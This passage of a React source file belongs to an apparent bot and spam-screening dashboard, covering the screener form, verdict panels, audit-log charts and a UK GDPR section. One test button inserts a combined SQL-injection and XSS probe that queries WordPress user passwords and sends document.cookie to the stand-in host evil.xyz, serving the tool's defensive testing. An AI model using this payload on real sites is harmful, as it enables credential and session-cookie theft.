                {/* Main Payload / Message Body with Live Entropy & Gibberish Telemetry */}
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-xs flex-wrap gap-2">
                    <label htmlFor="message-body" className="font-medium text-slate-300">
                      {channel === 'smtp_mail'
                        ? 'SMTP Body Payload ($_POST[\'message\'])'
                        : 'Direct Message / Form Input Body'}
                    </label>
                    <div className="flex items-center gap-2 font-mono text-[11px] text-slate-400">
                      <span>Entropy: {liveInputEntropy} bits/char</span>
                      <span>·</span>
                      <span>
                        Gibberish Check: {liveGibberish.isGibberish ? 'FLAGGED' : 'NATURAL'}
                      </span>
                    </div>
                  </div>
                  <textarea
                    id="message-body"
                    rows={4}
                    value={messageBody}
                    onChange={(e) => setMessageBody(e.target.value)}
                    onKeyDown={handleLiveKeyDown}
                    onPaste={handleLivePaste}
                    placeholder="Type normally or test keyboard mashing (asdfjkl;), SQLi (' OR 1=1 --), or spam links..."
                    className="w-full px-3 py-2.5 text-sm bg-slate-950 border border-slate-800 rounded-md text-white focus:outline-none focus:border-sky-400 leading-relaxed"
                  />
                  <div className="flex items-center gap-2 text-[11px] text-slate-400 flex-wrap">
                    <span>Inject Payload:</span>
                    <button
                      type="button"
                      onClick={() =>
                        setMessageBody('asdfjkl; qwerzxcv dfghjkl cvbnm 9817234 asdfghjkl')
                      }
                      className="text-amber-400 hover:underline cursor-pointer"
                    >
                      Keyboard Mash
                    </button>
                    <span>·</span>
                    <button
                      type="button"
                      onClick={() =>
                        setMessageBody(
                          "Hello ' UNION ALL SELECT user_login, user_pass FROM wp_users WHERE 1=1 -- <script>fetch('https://evil.xyz/steal?c='+document.cookie)</script>"
                        )
                      }
                      className="text-rose-400 hover:underline cursor-pointer"
                    >
                      SQLi + XSS Probe
                    </button>
                    <span>·</span>
                    <button
                      type="button"
                      onClick={() =>
                        setMessageBody(
                          'Check out https://cheap-deals.xyz/1 and https://crypto-airdrop.top/2 and https://fast-loan.click/3 now!'
                        )
                      }
                      className="text-amber-400 hover:underline cursor-pointer"
                    >
                      DM Link Flood
                    </button>
                  </div>
                </div>

                {/* HTTP Request Headers & Behavioral Telemetry Controls */}
                <div className="pt-4 border-t border-slate-800 space-y-4">
                  <div className="flex items-center justify-between">
                    <h3 className="text-xs font-semibold text-slate-300">
                      HTTP Request Headers &amp; Client Behavioral Telemetry
                    </h3>
                    <div className="flex items-center gap-2 text-xs">
                      <button
                        type="button"
                        onClick={() => {
                          setUserAgent('python-requests/2.31.0');
                          setAcceptLanguage('');
                          setSecFetchSite('');
                          setTypingDurationMs(35);
                          setKeystrokeCount(0);
                        }}
                        className="text-rose-400 hover:underline cursor-pointer"
                      >
                        Simulate Python Bot Headers
                      </button>
                      <span className="text-slate-600">·</span>
                      <button
                        type="button"
                        onClick={() => {
                          setUserAgent(
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36'
                          );
                          setAcceptLanguage('en-GB,en;q=0.9');
                          setSecFetchSite('same-origin');
                          setSecFetchMode('cors');
                          setTypingDurationMs(8400);
                          setKeystrokeCount(110);
                          setHoneypotFilled(false);
                        }}
                        className="text-emerald-400 hover:underline cursor-pointer"
                      >
                        Restore Browser Headers
                      </button>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                    <div>
                      <label className="block text-[11px] text-slate-400 mb-1">
                        HTTP_USER_AGENT
                      </label>
                      <input
                        type="text"
                        value={userAgent}
                        onChange={(e) => setUserAgent(e.target.value)}
                        className="w-full px-2.5 py-1.5 text-xs font-mono bg-slate-950 border border-slate-800 rounded text-slate-200"
                      />
                    </div>
                    <div>
                      <label className="block text-[11px] text-slate-400 mb-1">
                        HTTP_ACCEPT_LANGUAGE
                      </label>
                      <input
                        type="text"
                        value={acceptLanguage}
                        onChange={(e) => setAcceptLanguage(e.target.value)}
                        placeholder="e.g. en-GB,en;q=0.9"
                        className="w-full px-2.5 py-1.5 text-xs font-mono bg-slate-950 border border-slate-800 rounded text-slate-200"
                      />
                    </div>
                    <div>
                      <label className="block text-[11px] text-slate-400 mb-1">
                        HTTP_SEC_FETCH_SITE
                      </label>
                      <select
                        value={secFetchSite}
                        onChange={(e) => setSecFetchSite(e.target.value)}
                        className="w-full px-2.5 py-1.5 text-xs font-mono bg-slate-950 border border-slate-800 rounded text-slate-200"
                      >
                        <option value="same-origin">same-origin</option>
                        <option value="same-site">same-site</option>
                        <option value="cross-site">cross-site (Suspicious POST)</option>
                        <option value="">(Missing Header)</option>
                      </select>
                    </div>
                  </div>

                  {/* Behavioral Telemetry Sliders & Traps */}
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-1">
                    <div className="bg-slate-950 border border-slate-800/90 rounded p-2.5">
                      <div className="text-[11px] text-slate-400">Form Fill Time (ms)</div>
                      <input
                        type="number"
                        value={typingDurationMs}
                        onChange={(e) => setTypingDurationMs(Number(e.target.value))}
                        className="w-full mt-1 text-xs font-mono font-semibold text-white bg-transparent focus:outline-none"
                      />
                    </div>
                    <div className="bg-slate-950 border border-slate-800/90 rounded p-2.5">
                      <div className="text-[11px] text-slate-400">DOM Keystrokes</div>
                      <input
                        type="number"
                        value={keystrokeCount}
                        onChange={(e) => setKeystrokeCount(Number(e.target.value))}
                        className="w-full mt-1 text-xs font-mono font-semibold text-white bg-transparent focus:outline-none"
                      />
                    </div>
                    <label className="bg-slate-950 border border-slate-800/90 rounded p-2.5 flex items-center justify-between cursor-pointer">
                      <span className="text-[11px] text-slate-300">Honeypot Trap</span>
                      <input
                        type="checkbox"
                        checked={honeypotFilled}
                        onChange={(e) => setHoneypotFilled(e.target.checked)}
                        className="accent-rose-500"
                      />
                    </label>
                    <label className="bg-slate-950 border border-slate-800/90 rounded p-2.5 flex items-center justify-between cursor-pointer">
                      <span className="text-[11px] text-slate-300">UK Notice Agreed</span>
                      <input
                        type="checkbox"
                        checked={bannerAgreed}
                        onChange={(e) => setBannerAgreed(e.target.checked)}
                        className="accent-sky-400"
                      />
                    </label>
                  </div>
                </div>

                {/* Submit / Log Button */}
                <div className="pt-2 flex items-center justify-between gap-4">
                  <div className="text-xs text-slate-400">
                    Screening hashes IP via{' '}
                    <span className="text-slate-200 font-mono">HMAC-SHA256</span> prior to storage.
                  </div>
                  <button
                    type="submit"
                    className="px-5 py-2.5 text-xs font-semibold text-slate-950 bg-sky-400 hover:bg-sky-300 rounded-lg transition-colors flex items-center gap-2 whitespace-nowrap shrink-0 cursor-pointer"
                  >
                    <Play className="w-3.5 h-3.5 fill-current" />
                    <span>Screen &amp; Record to UK Audit Log</span>
                  </button>
                </div>
              </form>

              {/* Right Column (5 cols): Real-Time 4-Vector Verdict & SMTP/DM Gate Status */}
              <div className="lg:col-span-5 space-y-4">
                {/* Primary Verdict Banner Card */}
                <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-6 space-y-5">
                  <div className="flex items-start justify-between gap-4">
                    <div className="space-y-1">
                      <div className="text-xs text-slate-400">Real-Time PHP Middleware Verdict</div>
                      <div className="flex items-center gap-2.5">
                        {liveEvaluation.verdict === 'ALLOW' && (
                          <ShieldCheck className="w-6 h-6 text-emerald-400 shrink-0" />
                        )}
                        {liveEvaluation.verdict === 'CHALLENGE' && (
                          <AlertTriangle className="w-6 h-6 text-amber-400 shrink-0" />
                        )}
                        {liveEvaluation.verdict === 'BLOCK' && (
                          <ShieldAlert className="w-6 h-6 text-rose-400 shrink-0" />
                        )}
                        <span
                          className={`text-2xl font-bold tracking-tight ${
                            liveEvaluation.verdict === 'ALLOW'
                              ? 'text-emerald-400'
                              : liveEvaluation.verdict === 'CHALLENGE'
                              ? 'text-amber-400'
                              : 'text-rose-400'
                          }`}
                        >
                          {liveEvaluation.verdict === 'ALLOW'
                            ? 'ALLOW DISPATCH'
                            : liveEvaluation.verdict === 'CHALLENGE'
                            ? 'HOLD / CHALLENGE'
                            : 'BLOCK & LOG THREAT'}
                        </span>
                      </div>
                    </div>

                    <div className="text-right font-mono tabular-nums">
                      <div className="text-xs text-slate-400">Composite Risk</div>
                      <div
                        className={`text-3xl font-bold ${
                          liveEvaluation.totalRiskScore >= config.blockThreshold
                            ? 'text-rose-400'
                            : liveEvaluation.totalRiskScore >= config.challengeThreshold
                            ? 'text-amber-400'
                            : 'text-emerald-400'
                        }`}
                      >
                        {liveEvaluation.totalRiskScore}
                        <span className="text-sm text-slate-500 font-normal">/100</span>
                      </div>
                    </div>
                  </div>

                  {/* Dispatch Safety Gates for SMTP and Direct Messaging */}
                  <div className="grid grid-cols-2 gap-3 pt-2 border-t border-slate-800/80 text-xs">
                    <div className="bg-slate-950 border border-slate-800/90 rounded p-3">
                      <div className="text-slate-400">SMTP Relay Gate</div>
                      <div
                        className={`font-semibold mt-1 flex items-center gap-1.5 ${
                          liveEvaluation.smtpSafeToDispatch ? 'text-emerald-400' : 'text-rose-400'
                        }`}
                      >
                        <span>
                          {liveEvaluation.smtpSafeToDispatch
                            ? 'SAFE TO SEND MAIL'
                            : 'SMTP RELAY HALTED'}
                        </span>
                      </div>
                    </div>
                    <div className="bg-slate-950 border border-slate-800/90 rounded p-3">
                      <div className="text-slate-400">Direct Message Gate</div>
                      <div
                        className={`font-semibold mt-1 flex items-center gap-1.5 ${
                          liveEvaluation.dmSafeToDeliver ? 'text-emerald-400' : 'text-rose-400'
                        }`}
                      >
                        <span>
                          {liveEvaluation.dmSafeToDeliver
                            ? 'SAFE TO DELIVER DM'
                            : 'DM DELIVERY QUARANTINED'}
                        </span>
                      </div>
                    </div>
                  </div>

                  {/* Critical Risk Incident Email Notification Status */}
                  {liveEvaluation.criticalAlertTriggered && (
                    <div className="bg-rose-950/30 border border-rose-500/40 rounded-lg p-3 text-xs flex items-center justify-between gap-3">
                      <div className="space-y-0.5">
                        <div className="font-semibold text-rose-300 flex items-center gap-1.5">
                          <Mail className="w-3.5 h-3.5 text-rose-400 shrink-0" />
                          <span>
                            Critical Risk Alert Triggered ({liveEvaluation.totalRiskScore} &ge;{' '}
                            {config.criticalRiskThreshold})
                          </span>
                        </div>
                        <div className="text-slate-400 font-mono text-[11px]">
                          PHP mail() alert dispatched to: {liveEvaluation.alertDispatchedTo}
                        </div>
                      </div>
                      <button
                        type="button"
                        onClick={() => setActiveSection('compliance')}
                        className="px-2.5 py-1 text-[11px] font-medium text-rose-200 bg-rose-900/40 hover:bg-rose-900/60 border border-rose-500/30 rounded transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                      >
                        Configure Alert
                      </button>
                    </div>
                  )}

                  {/* 4-Vector Breakdown List */}
                  <div className="space-y-3 pt-2">
                    {(
                      [
                        {
                          key: 'ipReputation',
                          title: '01. IP Reputation & Network ASN',
                          data: liveEvaluation.vectors.ipReputation,
                        },
                        {
                          key: 'emailHygiene',
                          title: '02. Email Format & SMTP Header Safety',
                          data: liveEvaluation.vectors.emailHygiene,
                        },
                        {
                          key: 'behaviorAndPayload',
                          title: '03. Input Entropy, Gibberish & Payloads',
                          data: liveEvaluation.vectors.behaviorAndPayload,
                        },
                        {
                          key: 'requestHeaders',
                          title: '04. HTTP Request Header Integrity',
                          data: liveEvaluation.vectors.requestHeaders,
                        },
                      ] as const
                    ).map((vec) => (
                      <div
                        key={vec.key}
                        className="bg-slate-950 border border-slate-800/90 rounded-lg p-3.5 space-y-2"
                      >
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-xs font-semibold text-slate-200">{vec.title}</span>
                          <span
                            className={`text-xs font-mono tabular-nums font-semibold ${
                              vec.data.status === 'CRITICAL'
                                ? 'text-rose-400'
                                : vec.data.status === 'ELEVATED'
                                ? 'text-amber-400'
                                : 'text-emerald-400'
                            }`}
                          >
                            {vec.data.status} · {vec.data.score}/100
                          </span>
                        </div>

                        <p className="text-xs text-slate-400 leading-relaxed">{vec.data.summary}</p>

                        {vec.data.flags.length > 0 && (
                          <ul className="space-y-1 pt-1 border-t border-slate-900 text-[11px] text-rose-300">
                            {vec.data.flags.map((flag, i) => (
                              <li key={i} className="flex items-start gap-1.5">
                                <span className="text-rose-400 shrink-0">•</span>
                                <span>{flag}</span>
                              </li>
                            ))}
                          </ul>
                        )}

                        <div className="grid grid-cols-2 gap-x-4 gap-y-1 pt-1 text-[11px] text-slate-400 font-mono">
                          {Object.entries(vec.data.metrics).map(([k, v]) => (
                            <div key={k} className="truncate">
                              <span className="text-slate-500">{k}: </span>
                              <span className="text-slate-300">{v}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ===================================================================
         * WORKSPACE 2: PROTECTIVE AUDIT LOGS & FORENSIC INSPECTOR
         * =================================================================== */}
        {activeSection === 'logs' && (
          <div className="space-y-6">
            {/* 24-Hour Time-Series Trend Chart (Blocked vs. Allowed Requests) */}
            <div className="bg-slate-900/50 border border-slate-800 rounded-lg p-6 space-y-5">
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-4 border-b border-slate-800/80">
                <div className="space-y-1">
                  <div className="text-xs text-slate-400 flex items-center gap-2 flex-wrap">
                    <span>24-Hour Telemetry Window (UTC)</span>
                    <span aria-hidden="true">·</span>
                    <span>
                      Scope: {logChannelFilter === 'ALL' ? 'All Protected Endpoints' : channelLabel(logChannelFilter)}
                    </span>
                  </div>
                  <h2 className="text-base font-semibold text-white">
                    01. 24-Hour Request Screening Trend: Blocked vs. Allowed Traffic
                  </h2>
                </div>

                <div className="flex items-center gap-6 flex-wrap">
                  {/* 24h Summary Metrics with Tabular Numerals */}
                  <div className="flex items-center gap-5 text-xs font-mono tabular-nums">
                    <div>
                      <span className="text-slate-400">Allowed (24h): </span>
                      <span className="font-bold text-emerald-400">{trend24hTotals.allowed}</span>
                    </div>
                    <span className="text-slate-700" aria-hidden="true">/</span>
                    <div>
                      <span className="text-slate-400">Blocked (24h): </span>
                      <span className="font-bold text-rose-400">{trend24hTotals.blocked}</span>
                    </div>
                    <span className="text-slate-700" aria-hidden="true">/</span>
                    <div>
                      <span className="text-slate-400">Challenged (24h): </span>
                      <span className="font-bold text-amber-400">{trend24hTotals.challenged}</span>
                    </div>
                  </div>

                  {/* Chart Type Segmented Control */}
                  <div className="flex items-center gap-1 p-1 bg-slate-950 border border-slate-800 rounded-lg shrink-0">
                    <button
                      type="button"
                      onClick={() => setTrendChartMode('area')}
                      className={`px-3 py-1 text-xs font-medium rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer ${
                        trendChartMode === 'area'
                          ? 'bg-slate-800 text-white'
                          : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      Area Trend
                    </button>
                    <button
                      type="button"
                      onClick={() => setTrendChartMode('bar')}
                      className={`px-3 py-1 text-xs font-medium rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer ${
                        trendChartMode === 'bar'
                          ? 'bg-slate-800 text-white'
                          : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      Hourly Bars
                    </button>
                  </div>
                </div>
              </div>

              {/* Recharts Responsive Viewport */}
              <div className="h-64 w-full">
                <ResponsiveContainer width="100%" height="100%">
                  {trendChartMode === 'area' ? (
                    <AreaChart
                      data={trend24hData}
                      margin={{ top: 8, right: 12, left: -16, bottom: 0 }}
                    >
                      <defs>
                        <linearGradient id="aegisAllowedGrad" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#10b981" stopOpacity={0.35} />
                          <stop offset="95%" stopColor="#10b981" stopOpacity={0.0} />
                        </linearGradient>
                        <linearGradient id="aegisBlockedGrad" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#f43f5e" stopOpacity={0.4} />
                          <stop offset="95%" stopColor="#f43f5e" stopOpacity={0.0} />
                        </linearGradient>
                        <linearGradient id="aegisChallengedGrad" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#f59e0b" stopOpacity={0.3} />
                          <stop offset="95%" stopColor="#f59e0b" stopOpacity={0.0} />
                        </linearGradient>
                      </defs>
                      <CartesianGrid strokeDasharray="3 3" stroke="#1e293b" vertical={false} />
                      <XAxis
                        dataKey="hourLabel"
                        stroke="#64748b"
                        tick={{ fill: '#94a3b8', fontSize: 11, fontFamily: 'JetBrains Mono, monospace' }}
                        tickLine={false}
                        axisLine={{ stroke: '#1e293b' }}
                        minTickGap={24}
                      />
                      <YAxis
                        stroke="#64748b"
                        tick={{ fill: '#94a3b8', fontSize: 11, fontFamily: 'JetBrains Mono, monospace' }}
                        tickLine={false}
                        axisLine={false}
                      />
                      <Tooltip
                        contentStyle={{
                          backgroundColor: '#090d16',
                          borderColor: '#334155',
                          borderRadius: '8px',
                          fontSize: '12px',
                          fontFamily: 'JetBrains Mono, monospace',
                          color: '#f1f5f9',
                        }}
                        itemStyle={{ padding: '2px 0' }}
                        labelStyle={{ color: '#e2e8f0', fontWeight: 600, marginBottom: '4px' }}
                      />
                      <Area
                        type="monotone"
                        dataKey="allowed"
                        name="Allowed (Safe)"
                        stroke="#10b981"
                        strokeWidth={2}
                        fillOpacity={1}
                        fill="url(#aegisAllowedGrad)"
                      />
                      <Area
                        type="monotone"
                        dataKey="blocked"
                        name="Blocked (Threat)"
                        stroke="#f43f5e"
                        strokeWidth={2}
                        fillOpacity={1}
                        fill="url(#aegisBlockedGrad)"
                      />
                      <Area
                        type="monotone"
                        dataKey="challenged"
                        name="Challenged (Hold)"
                        stroke="#f59e0b"
                        strokeWidth={1.5}
                        fillOpacity={1}
                        fill="url(#aegisChallengedGrad)"
                      />
                    </AreaChart>
                  ) : (
                    <BarChart
                      data={trend24hData}
                      margin={{ top: 8, right: 12, left: -16, bottom: 0 }}
                    >
                      <CartesianGrid strokeDasharray="3 3" stroke="#1e293b" vertical={false} />
                      <XAxis
                        dataKey="hourLabel"
                        stroke="#64748b"
                        tick={{ fill: '#94a3b8', fontSize: 11, fontFamily: 'JetBrains Mono, monospace' }}
                        tickLine={false}
                        axisLine={{ stroke: '#1e293b' }}
                        minTickGap={24}
                      />
                      <YAxis
                        stroke="#64748b"
                        tick={{ fill: '#94a3b8', fontSize: 11, fontFamily: 'JetBrains Mono, monospace' }}
                        tickLine={false}
                        axisLine={false}
                      />
                      <Tooltip
                        contentStyle={{
                          backgroundColor: '#090d16',
                          borderColor: '#334155',
                          borderRadius: '8px',
                          fontSize: '12px',
                          fontFamily: 'JetBrains Mono, monospace',
                          color: '#f1f5f9',
                        }}
                        labelStyle={{ color: '#e2e8f0', fontWeight: 600, marginBottom: '4px' }}
                      />
                      <Bar dataKey="allowed" name="Allowed (Safe)" fill="#10b981" radius={[2, 2, 0, 0]} />
                      <Bar dataKey="blocked" name="Blocked (Threat)" fill="#f43f5e" radius={[2, 2, 0, 0]} />
                      <Bar dataKey="challenged" name="Challenged (Hold)" fill="#f59e0b" radius={[2, 2, 0, 0]} />
                    </BarChart>
                  )}
                </ResponsiveContainer>
              </div>
            </div>

            {/* Filter & Action Toolbar */}
            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-4 flex flex-col lg:flex-row lg:items-center justify-between gap-4">
              <div className="flex items-center gap-3 flex-wrap">
                {/* Segmented Verdict Filter */}
                <div className="flex items-center gap-1 p-1 bg-slate-950 border border-slate-800 rounded-lg">
                  {(['ALL', 'BLOCK', 'CHALLENGE', 'ALLOW'] as const).map((v) => (
                    <button
                      key={v}
                      type="button"
                      onClick={() => setLogVerdictFilter(v)}
                      className={`px-3 py-1 text-xs font-medium rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer ${
                        logVerdictFilter === v
                          ? 'bg-slate-800 text-white'
                          : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      {v === 'ALL' ? 'All Verdicts' : v}
                    </button>
                  ))}
                </div>

                {/* Channel Filter */}
                <select
                  value={logChannelFilter}
                  onChange={(e) => setLogChannelFilter(e.target.value as 'ALL' | ChannelType)}
                  className="px-3 py-1.5 text-xs bg-slate-950 border border-slate-800 rounded-lg text-slate-200"
                >
                  <option value="ALL">All Channels (SMTP / DM / Form)</option>
                  <option value="smtp_mail">SMTP Mail Dispatch</option>
                  <option value="direct_message">Direct Message (DM)</option>
                  <option value="contact_form">Web Contact Form</option>
                  <option value="api_webhook">API Webhook POST</option>
                </select>

                {/* Search Input */}
                <div className="relative">
                  <Search className="w-3.5 h-3.5 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={logSearchQuery}
                    onChange={(e) => setLogSearchQuery(e.target.value)}
                    placeholder="Search hash, email, subject..."
                    className="pl-8 pr-3 py-1.5 text-xs bg-slate-950 border border-slate-800 rounded-lg text-white focus:outline-none focus:border-sky-400 w-56"
                  />
                </div>
              </div>

              <div className="flex items-center gap-2.5 flex-wrap">
                <button
                  type="button"
                  onClick={handleSimulateTrafficWave}
                  className="px-3 py-1.5 text-xs font-medium bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                >
                  Simulate Bot &amp; Mail Wave
                </button>
                <button
                  type="button"
                  onClick={handleExportLogsJson}
                  className="px-3 py-1.5 text-xs font-medium bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                >
                  Export JSON
                </button>
                <button
                  type="button"
                  onClick={() => setAuditLogs([])}
                  className="px-3 py-1.5 text-xs font-medium text-rose-300 hover:text-rose-200 border border-slate-800 hover:border-rose-500/40 rounded-md transition-colors whitespace-nowrap shrink-0 flex items-center gap-1.5 cursor-pointer"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                  <span>Purge Logs</span>
                </button>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
              {/* High-Density Tabular Audit Grid (7 cols) */}
              <div className="lg:col-span-7 bg-slate-900/50 border border-slate-800 rounded-lg overflow-hidden">
                {filteredLogs.length === 0 ? (
                  <div className="p-12 text-center space-y-3">
                    <div className="text-sm font-semibold text-slate-300">
                      No Screened Security Events Match Current Filter
                    </div>
                    <p className="text-xs text-slate-400 max-w-md mx-auto">
                      Trigger a live screening test in the Screener tab or populate sample bot and legitimate SMTP/DM traffic below.
                    </p>
                    <button
                      type="button"
                      onClick={handleSimulateTrafficWave}
                      className="px-4 py-2 text-xs font-semibold text-slate-950 bg-sky-400 rounded-md hover:bg-sky-300 transition-colors cursor-pointer"
                    >
                      Populate Protective Audit Logs
                    </button>
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse">
                      <thead>
                        <tr className="border-b border-slate-800 text-[11px] font-semibold text-slate-400 bg-slate-950/60">
                          <th className="py-2.5 px-3">Audit ID / Time</th>
                          <th className="py-2.5 px-3">Channel</th>
                          <th className="py-2.5 px-3">Pseudonymised IP (UK GDPR)</th>
                          <th className="py-2.5 px-3">Sender Email</th>
                          <th className="py-2.5 px-3 text-right">Verdict · Score</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800/70 text-xs">
                        {filteredLogs.map((log) => {
                          const isSelected = selectedLog?.id === log.id;
                          return (
                            <tr
                              key={log.id}
                              onClick={() => setSelectedLogId(log.id)}
                              className={`cursor-pointer transition-colors ${
                                isSelected ? 'bg-sky-500/10' : 'hover:bg-slate-800/40'
                              }`}
                            >
                              <td className="py-2.5 px-3 font-mono tabular-nums whitespace-nowrap">
                                <div className="font-semibold text-slate-200">{log.id}</div>
                                <div className="text-[11px] text-slate-500">
                                  {log.timestamp.slice(11, 19)} UTC
                                </div>
                              </td>
                              <td className="py-2.5 px-3 text-slate-300 whitespace-nowrap">
                                {channelLabel(log.channel)}
                              </td>
                              <td className="py-2.5 px-3 font-mono text-[11px] text-slate-300 whitespace-nowrap">
                                {log.pseudonymisedIp}
                              </td>
                              <td className="py-2.5 px-3 font-mono text-[11px] text-slate-300 max-w-[170px] truncate">
                                {log.senderEmail}
                              </td>
                              <td className="py-2.5 px-3 text-right font-mono tabular-nums whitespace-nowrap">
                                <span
                                  className={`font-semibold ${
                                    log.verdict === 'BLOCK'
                                      ? 'text-rose-400'
                                      : log.verdict === 'CHALLENGE'
                                      ? 'text-amber-400'
                                      : 'text-emerald-400'
                                  }`}
                                >
                                  {log.verdict}
                                </span>
                                <span className="text-slate-500"> · </span>
                                <span className="text-slate-200">{log.totalRiskScore}</span>
                              </td>
                            </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>

              {/* Forensic Record Inspector (5 cols) */}
              <div className="lg:col-span-5 bg-slate-900/60 border border-slate-800 rounded-lg p-6 space-y-5">
                {selectedLog ? (
                  <>
                    <div className="flex items-start justify-between gap-4 pb-4 border-b border-slate-800">
                      <div>
                        <div className="text-xs text-slate-400 font-mono">
                          {selectedLog.id} · {selectedLog.timestamp.replace('T', ' ').slice(0, 19)} UTC
                        </div>
                        <h3 className="text-base font-bold text-white mt-0.5">
                          {channelLabel(selectedLog.channel)} Inspection
                        </h3>
                      </div>
                      <div className="text-right font-mono tabular-nums">
                        <div
                          className={`text-sm font-bold ${
                            selectedLog.verdict === 'BLOCK'
                              ? 'text-rose-400'
                              : selectedLog.verdict === 'CHALLENGE'
                              ? 'text-amber-400'
                              : 'text-emerald-400'
                          }`}
                        >
                          {selectedLog.verdict} ({selectedLog.totalRiskScore}/100)
                        </div>
                        <div className="text-[11px] text-slate-400">
                          Expires: {selectedLog.ukCompliance.retentionExpiresAt}
                        </div>
                      </div>
                    </div>

                    <div className="space-y-2 text-xs">
                      <div className="grid grid-cols-3 gap-2 py-1 border-b border-slate-800/60">
                        <span className="text-slate-400">UK Pseudonymised IP:</span>
                        <span className="col-span-2 font-mono text-slate-200">
                          {selectedLog.pseudonymisedIp}
                        </span>
                      </div>
                      <div className="grid grid-cols-3 gap-2 py-1 border-b border-slate-800/60">
                        <span className="text-slate-400">Sender Input:</span>
                        <span className="col-span-2 font-mono text-slate-200 break-all">
                          {selectedLog.senderEmail}
                        </span>
                      </div>
                      <div className="grid grid-cols-3 gap-2 py-1 border-b border-slate-800/60">
                        <span className="text-slate-400">Subject / Topic:</span>
                        <span className="col-span-2 font-mono text-slate-200 break-all">
                          {selectedLog.subjectOrTopic}
                        </span>
                      </div>
                      <div className="grid grid-cols-3 gap-2 py-1 border-b border-slate-800/60">
                        <span className="text-slate-400">UK Lawful Basis:</span>
                        <span className="col-span-2 text-slate-300">
                          {selectedLog.ukCompliance.lawfulBasis}
                        </span>
                      </div>
                      <div className="grid grid-cols-3 gap-2 py-1 border-b border-slate-800/60">
                        <span className="text-slate-400">Banner Agreed:</span>
                        <span className="col-span-2 font-mono text-slate-200">
                          {selectedLog.ukCompliance.bannerAcknowledged
                            ? 'YES (Signed Session Token)'
                            : 'NO (Unacknowledged Client)'}
                        </span>
                      </div>
                      <div className="grid grid-cols-3 gap-2 py-1 border-b border-slate-800/60">
                        <span className="text-slate-400">Critical Email Alert:</span>
                        <span
                          className={`col-span-2 font-mono ${
                            selectedLog.criticalAlertTriggered
                              ? 'text-rose-400 font-semibold'
                              : 'text-slate-400'
                          }`}
                        >
                          {selectedLog.criticalAlertTriggered
                            ? `SENT -> ${selectedLog.alertDispatchedTo}`
                            : `Not Triggered (< ${config.criticalRiskThreshold})`}
                        </span>
                      </div>
                    </div>

                    <div className="space-y-1.5">
                      <div className="text-xs font-semibold text-slate-300">
                        Screened Payload Excerpt
                      </div>
                      <pre className="p-3 rounded bg-slate-950 border border-slate-800 text-[11px] font-mono text-slate-300 whitespace-pre-wrap break-all">
                        {selectedLog.messagePreview}
                      </pre>
                    </div>

                    <div className="space-y-2">
                      <div className="text-xs font-semibold text-slate-300">
                        Triggered Heuristics &amp; Rule Flags
                      </div>
                      {[
                        ...selectedLog.vectors.ipReputation.flags,
                        ...selectedLog.vectors.emailHygiene.flags,
                        ...selectedLog.vectors.behaviorAndPayload.flags,
                        ...selectedLog.vectors.requestHeaders.flags,
                      ].length === 0 ? (
                        <div className="text-xs text-emerald-400 bg-slate-950 border border-slate-800 p-3 rounded">
                          Zero threat signatures matched. Verified safe for outbound SMTP / DM delivery.
                        </div>
                      ) : (
                        <ul className="space-y-1.5 bg-slate-950 border border-slate-800 p-3 rounded text-xs text-rose-300">
                          {[
                            ...selectedLog.vectors.ipReputation.flags,
                            ...selectedLog.vectors.emailHygiene.flags,
                            ...selectedLog.vectors.behaviorAndPayload.flags,
                            ...selectedLog.vectors.requestHeaders.flags,
                          ].map((f, i) => (
                            <li key={i} className="flex items-start gap-2">
                              <span className="text-rose-400 font-mono">•</span>
                              <span>{f}</span>
                            </li>
                          ))}
                        </ul>
                      )}
                    </div>
                  </>
                ) : (
                  <div className="text-xs text-slate-400 py-8 text-center">
                    Select any log row on the left to inspect its full 4-vector forensic breakdown.
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* ===================================================================
         * WORKSPACE 3: UK GDPR, DPA 2018 & PECR COMPLIANCE & BANNER STUDIO
         * =================================================================== */}
        {activeSection === 'compliance' && (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
            {/* Left Column (7 cols): UK Regulatory Configuration & Rule Thresholds */}
            <div className="lg:col-span-7 bg-slate-900/50 border border-slate-800 rounded-lg p-6 space-y-6">
              <div className="pb-4 border-b border-slate-800">
                <h2 className="text-base font-semibold text-white">
                  01. UK GDPR, Data Protection Act 2018 &amp; PECR Governance
                </h2>
                <p className="text-xs text-slate-400 mt-0.5">
                  Configure your UK Information Commissioner&apos;s Office (ICO) controller metadata, IP pseudonymisation mode, and mandatory visitor screening agreement banner.
                </p>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="space-y-1.5">
